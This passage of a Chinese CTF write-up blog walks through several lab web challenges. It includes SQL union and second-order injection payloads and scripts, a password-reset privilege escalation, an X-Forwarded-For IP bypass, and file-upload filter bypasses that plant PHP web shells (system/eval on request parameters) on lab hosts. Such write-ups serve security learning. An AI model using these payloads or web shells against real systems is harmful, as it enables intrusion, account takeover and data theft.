class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ob_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD HTML 4.01&#x2F;&#x2F;EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">blockquote &#123; background: #eeeeee; &#125;</span><br><span class="line">h1 &#123; border-bottom: solid black 2px; &#125;</span><br><span class="line">h2 &#123; border-bottom: solid black 1px; &#125;</span><br><span class="line">.comment &#123; color: darkgreen; &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;iso-8859-1&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div align&#x3D;right class&#x3D;lastmod&gt;</span><br><span class="line">Last Modified: Fri Mar  31:33:7 UTC 1337</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;h1&gt;Login&lt;&#x2F;h1&gt;</span><br><span class="line">Login Page, do not try to hax here plox!&lt;br&gt;</span><br><span class="line">&lt;form method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">  ID:&lt;br&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;usr&quot;&gt;</span><br><span class="line">  &lt;br&gt;</span><br><span class="line">  Password:&lt;br&gt; </span><br><span class="line">  &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;pw&quot;&gt;</span><br><span class="line">  &lt;br&gt;&lt;br&gt;</span><br><span class="line">  &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;</span><br><span class="line">        $user &#x3D; $_POST[&#39;usr&#39;];</span><br><span class="line">        $pass &#x3D; $_POST[&#39;pw&#39;];</span><br><span class="line">        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);</span><br><span class="line">        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">        $row &#x3D; $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;br&gt;Some Error occourred!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($row[&#39;id&#39;]))&#123;</span><br><span class="line">            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);</span><br><span class="line">            header(&quot;Location: &#x2F;&quot;);</span><br><span class="line">            die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>获得信息有：数据库为sqlite；在name处注入（即usr变量），会在setcookie中呈现相应结果</p>
<p>分别post以下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usr&#x3D;&#39; union order by 3--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select name,sql from sqlite_master--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,group_concat(name) from users --+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,password from users where name&#x3D;admin--+&amp;pw&#x3D;123</span><br><span class="line">usr&#x3D;&#39; union select 1,group_concat(hint) from users--+&amp;pw&#x3D;123</span><br></pre></td></tr></table></figure>
<p>可以得到admin的密码为3fab54a50e770d830c0416df817567662a9dc85c</p>
<p>而hint的内容提示密码在pdf中，</p>
<p>在login.php下，提示密码的构成方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);</span><br></pre></td></tr></table></figure>
<p>使用python下的pdfminer库读取，找到sha1(str.”Salz!”)后等于admin密码的那一段，即为，这个随便抄一个代码就行</p>
<p>密码为ThinJerboa</p>
<p>进入admin.php，提交密码后得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sqlite小知识"><a href="#sqlite小知识" class="headerlink" title="sqlite小知识"></a>sqlite小知识</h3><p>sql中存在一个sqlite_master表，类似于mysql中的information_schema，拥有字段type/name/tbl_name/rootpage/sql</p>
<h3 id="python爬虫模板"><a href="#python爬虫模板" class="headerlink" title="python爬虫模板"></a>python爬虫模板</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_file</span>(<span class="params">url, index</span>):</span></span><br><span class="line">    local_filename = index+<span class="string">&#x27;-&#x27;</span>+url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    r = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(local_filename, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            <span class="keyword">if</span> chunk:</span><br><span class="line">                f.write(chunk)</span><br><span class="line">                f.flush</span><br><span class="line">    <span class="keyword">return</span> local_filename</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span>(<span class="params">root_link</span>):</span></span><br><span class="line">    print(root_link)</span><br><span class="line">    r = requests.get(root_link)</span><br><span class="line">    <span class="keyword">if</span> r.status_code==<span class="number">200</span>:</span><br><span class="line">        soup = BeautifulSoup(r.text)</span><br><span class="line">        index = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> link <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">            new_link = root_link + link.get(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">            print(<span class="string">&quot;root_link = &quot;</span> + root_link)</span><br><span class="line">            print(<span class="string">&quot;new_link = &quot;</span> + new_link)</span><br><span class="line">            <span class="keyword">if</span> new_link.endswith(<span class="string">&quot;.pdf&quot;</span>):</span><br><span class="line">                print(<span class="string">&quot;debug 1&quot;</span>)</span><br><span class="line">                file_path = download_file(new_link,<span class="built_in">str</span>(index))</span><br><span class="line">                print(<span class="string">&quot;downloading:&quot;</span>+new_link+<span class="string">&quot; -&gt; &quot;</span>+file_path)</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> new_link.endswith(<span class="string">&quot;.html&quot;</span>) <span class="keyword">and</span> new_link != url:</span><br><span class="line">                print(<span class="string">&quot;debug 2&quot;</span>)</span><br><span class="line">                get_url(new_link);</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;error occur&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    url = <span class="string">&quot;http://220.249.52.134:40279/&quot;</span></span><br><span class="line">    get_url(url)</span><br></pre></td></tr></table></figure>
<h3 id="python-pdfminer的用法"><a href="#python-pdfminer的用法" class="headerlink" title="python pdfminer的用法"></a>python pdfminer的用法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span>():</span><span class="comment">#打开pdf文件</span></span><br><span class="line">    <span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">&quot;./&quot;</span>) <span class="keyword">if</span> i.endswith(<span class="string">&quot;pdf&quot;</span>)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span>(<span class="params">path</span>):</span><span class="comment">#获取pdf文本</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">&#x27;utf-8&#x27;</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, <span class="built_in">set</span>()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span>():</span><span class="comment">#读取密码</span></span><br><span class="line">    pdf_path = get_pdf()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line">        <span class="built_in">print</span></span><br><span class="line">        <span class="string">&quot;Searching word in &quot;</span> + i</span><br><span class="line">        pdf_text = convert_pdf_2_text(i).split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">            sha1_password = hashlib.sha1(word + <span class="string">&quot;Salz!&quot;</span>).hexdigest()</span><br><span class="line">            <span class="keyword">if</span> sha1_password == <span class="string">&#x27;3fab54a50e770d830c0416df817567662a9dc85c&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span></span><br><span class="line">                <span class="string">&quot;Find the password :&quot;</span> + word</span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    find_password()</span><br></pre></td></tr></table></figure>
<h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><p>考察：网页提权，文件上传绕过，一句话木马</p>
<p><strong>第一步</strong></p>
<p>登录页面后，有登录、注册、找回密码三个页面。注册一个账号，登录后有主页、管理、个人信息、更改密码、登出五个页面。</p>
<p>点击管理页面，提示只有admin才能登录，因此确定需要通过某种方式登录admin。</p>
<p>尝试每个页面sqlmap跑注入，失败。</p>
<p>修改密码时，用户会短暂提权为root权限。而靶机的修改密码操作为先确认用户信息，再输入新密码。在输入新密码时使用burp抓包，修改用户名为admin，即可修改admin密码。</p>
<p><strong>第二步</strong></p>
<p>以admin用户登录后，点击Manage，提示IP not allowed</p>
<p>添加X-Forwarded-For字段，并设置值为127.0.0.1，提交后能成功登录</p>
<p><strong>第三步</strong></p>
<p>页面显示”where is the flag”</p>
<p>显示页面源码，源码中有注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- index.php?module&#x3D;filemanage&amp;do&#x3D;???--&gt;</span><br></pre></td></tr></table></figure>
<p>多次尝试后，do值为upload时有了新的页面</p>
<p><strong>第四步</strong></p>
<p>页面显示为上传一个图片，很明显是一个文件上传绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upfile&quot;; filename&#x3D;&quot;sqzr.php5&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt; highlight_file(__FILE__);system($_GET[&#39;cmd&#39;]);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>注意此处进行了三个过滤</p>
<ul>
<li><?php>标签的过滤：php代码也可以用<script langua="php">的方法绕过</li>
<li>php后缀的过滤：可以设置后缀从php2一直到php5</li>
<li>content-type的过滤：设置content-type为image/jpeg</li>
</ul>
<p><strong>最后一步</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;4257116016b10a693f5ed7b0a5effd5e&#125;</span><br></pre></td></tr></table></figure>
<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>用户在修改密码时，能短暂的拥有root权限。</p>
<h3 id="X-Forwarded-For"><a href="#X-Forwarded-For" class="headerlink" title="X-Forwarded-For"></a>X-Forwarded-For</h3><p>后端web server从X-Forward-For中获取client ip，因此可以用于绕过登录server时对主机IP的检测</p>
<h3 id="php代码的第二种表示方法"><a href="#php代码的第二种表示方法" class="headerlink" title="php代码的第二种表示方法"></a>php代码的第二种表示方法</h3><script language="php">

</script>

<h3 id="文件上传时php后缀检测的绕过"><a href="#文件上传时php后缀检测的绕过" class="headerlink" title="文件上传时php后缀检测的绕过"></a>文件上传时php后缀检测的绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phtml，php2，php3，php4，php5</span><br></pre></td></tr></table></figure>
<h2 id="ics07"><a href="#ics07" class="headerlink" title="ics07"></a>ics07</h2><p>考察：php弱等于判断绕过，一句话木马，菜刀</p>
<p><strong>第一步</strong></p>
<p>首先打开网页，只有“项目管理“可以进去</p>
<p>进入后，有一个view-source，打开，有用的部分如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">     <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123;</span><br><span class="line">       <span class="variable">$con</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;con&#x27;</span>];</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       <span class="variable">$filename</span> = <span class="string">&quot;backup/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/.+\.ph(p[3457]?|t|tml)$/i&#x27;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;Bad file extension&quot;</span>);</span><br><span class="line">       &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;uploaded&#x27;</span>);</span><br><span class="line">           <span class="variable">$f</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">           fwrite(<span class="variable">$f</span>, <span class="variable">$con</span>);</span><br><span class="line">           fclose(<span class="variable">$f</span>);</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string(<span class="variable">$_GET</span>[id]);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;select * from cetc007.user where id=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = mysql_fetch_object(<span class="variable">$result</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="literal">False</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="variable">$result</span>)<span class="keyword">die</span>(<span class="string">&quot;&lt;br &gt;something wae wrong ! &lt;br&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;id: &quot;</span>.<span class="variable">$result</span>-&gt;id.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$result</span>-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>第二步</strong></p>
<p>第一段很明显，是上传一个木马，但是需要$_SESSION[‘admin’]是true</p>
<p>第二段若$result是true，则会把$_SESSION[‘admin’]设置为true，则需要绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[id]) &amp;&amp; floatval(<span class="variable">$_GET</span>[id]) !== <span class="string">&#x27;1&#x27;</span> &amp;&amp; substr(<span class="variable">$_GET</span>[id], <span class="number">-1</span>) === <span class="string">&#x27;9&#x27;</span>) </span><br></pre></td></tr></table></figure>
<p>则url为</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.134:55693/index.php?page=1&amp;id=1a9&amp;submit=submit</span><br></pre></td></tr></table></figure>
<p>顺利绕过，页面显示结果</p>
<p>此处陷入误区，在id处尝试sql注入失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45552960&#x2F;article&#x2F;details&#x2F;102777514</span><br><span class="line">代码中使用了mysql_real_escape_string()函数 , 该函数用于转义SQL语句中使用的字符串中的特殊字符 , 防御SQL注入 . 虽然可以利用宽字符注入绕过这个防御机制 , 但是要求目标站点使用GBK编码 . 这些细节信息我都不知道 , 所以想要注入是比较难的</span><br></pre></td></tr></table></figure>


<p><strong>第三步</strong></p>
<p>上传一句话木马，需要绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#39;&#x2F;.+\.ph(p[3457]?|t|tml)$&#x2F;i&#39;, $filename))</span><br></pre></td></tr></table></figure>
<p>发现这段正则只对最后.进行了检查，因此可以通过/.的方式绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;..&#x2F;test.php&#x2F;.&amp;con&#x3D;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>最后一步</strong></p>
<p>菜刀连接<a target="_blank" rel="noopener" href="http://220.249.52.134:55693/uploaded/test.php">http://220.249.52.134:55693/uploaded/test.php</a></p>
<p>找到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;c28c1bc69e1ba8ab132b3dbded9232e4&#125;</span><br></pre></td></tr></table></figure>
<h2 id="unfinish"><a href="#unfinish" class="headerlink" title="unfinish"></a>unfinish</h2><p>考察：sql二次注入，python脚本编写</p>
<p><strong>第一步</strong></p>
<p>登录页面，使用御剑扫描后台，有login.php，register.php两个有效文件</p>
<p>register.php页面注册用户，需要填入email、username、password，以post方式提交</p>
<p>login.php页面登录，需要填入email、password，以post方式提交</p>
<p>登录为index.php页面，能显示用户名username</p>
<p>根据wp：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R3col/p/12690413.html">https://www.cnblogs.com/R3col/p/12690413.html</a></p>
<p><strong>第二步</strong></p>
<p>尝试使用sqlmap在register.php和login.php上进行注入，均失败</p>
<p><strong>第三步</strong></p>
<p>二次注入脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&quot;http://220.249.52.134:54877/register.php&quot;</span></span><br><span class="line">login_url = <span class="string">&quot;http://220.249.52.134:54877/login.php&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	register_data = &#123;</span><br><span class="line">		<span class="string">&quot;email&quot;</span>:<span class="string">&quot;111@123.com%d&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;username&quot;</span>:<span class="string">&quot;0&#x27; + ascii(substr((select * from flag) from %d for 1))+&#x27;0&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	response_register = requests.post(url=register_url, data=register_data)</span><br><span class="line"></span><br><span class="line">	login_data = &#123;</span><br><span class="line">		<span class="string">&quot;email&quot;</span>:<span class="string">&quot;111@123.com%d&quot;</span> % i,</span><br><span class="line">		<span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	response_login = requests.post(url=login_url, data=login_data)</span><br><span class="line">	<span class="comment"># print(response_login.text)</span></span><br><span class="line">	ans = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, response_login.text)</span><br><span class="line">	print(<span class="built_in">chr</span>(<span class="built_in">int</span>(ans.group(<span class="number">1</span>))), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没解决的问题时email和password会影响结果，不知道为何</p>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2494e4bf06734c39be2e1626f757ba4c&#125;</span><br></pre></td></tr></table></figure>
<h3 id="sql二次注入姿势"><a href="#sql二次注入姿势" class="headerlink" title="sql二次注入姿势"></a>sql二次注入姿势</h3><p>适用于输入数据时进行了过滤，但是网页显示数据库数据未进行过滤的情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0&#39; + ascii(substr(database(),1,1)) +&#39;0</span><br><span class="line">0&#39; + ascii(substr(database() from 1 for 1)) +&#39;0</span><br></pre></td></tr></table></figure>
<h3 id="python的网页操作（re库）"><a href="#python的网页操作（re库）" class="headerlink" title="python的网页操作（re库）"></a>python的网页操作（re库）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">resp = requests.post(url=url, data=data) <span class="comment">#以post提交数据，数据返回给resp</span></span><br><span class="line">resp.text <span class="comment">#响应报文</span></span><br><span class="line">re.search(pattern, string) <span class="comment">#搜索string中出现pattern的字符串</span></span><br></pre></td></tr></table></figure>
<h2 id="leaking"><a href="#leaking" class="headerlink" title="leaking"></a>leaking</h2><p>考察：node.js逃逸</p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/112387663">https://blog.csdn.net/weixin_44037296/article/details/112387663</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46676743/article/details/112669105">https://blog.csdn.net/weixin_46676743/article/details/112669105</a></p>
<p>不知道咋说，直接抄源码</p>
